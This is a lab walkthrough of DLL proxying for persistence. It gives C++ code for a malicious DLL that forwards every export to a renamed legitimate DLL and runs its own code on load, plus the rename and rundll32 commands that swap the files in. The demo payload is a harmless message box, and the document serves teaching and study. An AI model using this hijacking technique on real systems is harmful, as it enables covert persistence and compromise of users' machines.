# DLL Proxying for Persistence

## DLL Proxying for Persistence

This is a quick lab to get familiar with a technique that's been on my todo list for some time - DLL proxying. This technique could be used for persistence or to intercept data, but in this lab, I am only concerned with persistence.

### Overview

In the context of malware, DLL proxying is a DLL hijacking technique, where a legitimate DLL say, `legit.dll` is renamed to `legit1.dll` and a malicious dll, which exports **all** the same functions that the `legit1.dll` exports, is placed instead of `legit.dll`.

Once the dll is hijacked, whenever a program calls a function, say `exportedFunction1` from `legit.dll`, here is what happens:

* `legit.dll` gets loaded into the calling process and executes its malicious code, say reaches out to the C2
* `legit.dll` forwards the call to `exportedFunction1` in `legit1.dll`
* `legit1.dll` executes the `exportedFunction1`

This function forwarding from one DLL to another is what gives the technique its name - DLL proxying, since the malicious DLL is sitting in between the application calling the exported function and a legitimate DLL that implements that exported function.

At a high-level, below diagram shows how it all looks before and after the DLL is hijacked:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MInYxaoSXGFBVn3Hgya%2F-MInbe6vA1uOH7re8z8a%2Fimage.png?alt=media\&token=70d6ba04-fb6a-4a6c-b53d-6c63d4a68e25)

### Walkthrough

At a high level, the technique works as follows:

1. Decide on which DLL to hijack. Let's say, it's located in c:\temp\legit.dll. Move it to c:\temp\legit1.dll
2. Get a list of all the exported functions of c:\temp\legit1.dll
3. Create a malicious DLL malicious.dll, that once loaded by the target process, executes your payload
4. Inside the malicious.dll, redirect/forward **all** the exported functions by legit.dll (this is the DLL we are hijacking) to legit1.dll (this is still the same DLL we are hijacking, just with a new name)
5. Copy malicious.dll to c:\temp\legit.dll
6. At this point, any program that calls an **any** exported function in legit.dll will now execute your malicious payload and then transfer the execution to the same exported function in c:\temp\legit1.dll.

#### Target DLL

For demo purposes, we will create our own DLL legitimate DLL to be hijacked, called `legit.dll`:

{% tabs %}
{% tab title="legit-dll.cpp" %}
```cpp
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
{
    MessageBoxA(NULL, "Hi from legit exportedFunction1", "Hi from legit exportedFunction1", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
{
    MessageBoxA(NULL, "Hi from legit exportedFunction2", "Hi from legit exportedFunction2", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
{
    MessageBoxA(NULL, "Hi from legit exportedFunction3", "Hi from legit exportedFunction3", 0);
}
```
{% endtab %}
{% endtabs %}

Let's say we've now compiled the above as a `legit.dll` to `c:\temp\legit.dll`. It has 3 exported functions as shown below:

<div align="center"><img src="https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIN_VJqQIwMdebgALRL%2F-MIn2_46vClIlN9b8EY3%2Fimage.png?alt=media&#x26;token=5694d10a-02e5-4ddc-9a76-70b39f82b30f" alt=""></div>

To confirm the DLL works, we can see that calling `exportedFunction1` from inside the `legit.dll` gives a popup like this:

```
rundll32 c:\temp\legit.dll,exportedFunction1
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIN_VJqQIwMdebgALRL%2F-MIn3lQQTxSLpEXFcEc1%2Fimage.png?alt=media\&token=a80b6326-a791-488e-b085-276905cf4837)

We now have the `legit.dll` and its target function `exportedFunction1` to hijack, let's move on to the malicious DLL that will do the function proxying.

#### Malicious DLL

Let's now create the `malicious.dll` - we will be using it to hijack programs that call functions from `c:\temp\legit.dll`. Compile the below as a `malicious.dll`:

{% tabs %}
{% tab title="malicious-dll.cpp" %}
```cpp
#include "pch.h"

#pragma comment(linker, "/export:exportedFunction1=legit1.exportedFunction1")
#pragma comment(linker, "/export:exportedFunction2=legit1.exportedFunction2")
#pragma comment(linker, "/export:exportedFunction3=legit1.exportedFunction3")

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        MessageBoxA(NULL, "Hi from malicious dll", "Hi from malicious dll", 0);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
{% endtab %}
{% endtabs %}

The key piece in the `malicious.dll` is the `#pragma` comment at the top, that tells the linker to export / forward (technical name is `Forward Export`) functions `exportedFunction1`, `exportedFunction2`, `exportedFunction3` to the module `legit1.dll`.

Also, note that once the `malicious.dll` is loaded, it will display a prompt saying `Hi from malicious dll`, but this could be any payload of our choice:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIN_VJqQIwMdebgALRL%2F-MIn9B8jBs4yRljj_1xc%2Fimage.png?alt=media\&token=fa6523d4-33b9-4955-b005-ea16f329775e)

Let's test if the `malicious.dll` executes our payload - shows a message prompt:

```
rundll32 malicious.dll,whatever
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIN_VJqQIwMdebgALRL%2F-MIn6CP7g-ePVREQ80J7%2Fimage.png?alt=media\&token=13acea0d-4a14-482b-b96d-d9a01ecb5e3b)

#### DLL Proxying / Hijacking

We now have all the required pieces to test the dll proxying concept.

Let's move the `malicious.dll` to `c:\temp`, where `legit.dll` resides:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIN_VJqQIwMdebgALRL%2F-MIn7DFnEwprtV43KA0g%2Fimage.png?alt=media\&token=77a52fe5-6f7a-48e3-8dc1-ac8dbbaa24b3)

Rename the `legit.dll` to `legit1.dll` and `alicious.dll` to `legit.dll`:

```
mv .\legit.dll .\legit1.dll; mv .\malicious.dll .\legit.dll
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIN_VJqQIwMdebgALRL%2F-MIn7cz3LT_8PCIKS_X-%2Frename-files.gif?alt=media\&token=5e7fc02f-59bf-4be0-8e3a-1e3e52e4785f)

#### Moment of Truth

Now, let's invoke the `exportedFunction1` from `legit.dll` - this is our malicious DLL with DLL proxying enabled.

If the hijacking is successful, we will see the prompt `Hi from malicious dll` followed by the prompt `Hi from legit exportedFunction1` from the `legit1.dll`:

![Successful DLL proxying in action](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MIN_VJqQIwMdebgALRL%2F-MIn9gGZoTV1BugKCAq6%2Fdll-proxying-forwarding-in-action.gif?alt=media\&token=44f5f86a-f444-4c60-ba11-0e7ffde97c6c)

Implementing DLL proxying for a DLL that exports many functions may be a bit painful, but luckily there are multiple projects that help you automate this process, one of which is [https://github.com/Flangvik/SharpDllProxy](https://github.com/Flangvik/SharpDllProxy), so go check it out.

### References

{% embed url="https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf" %}
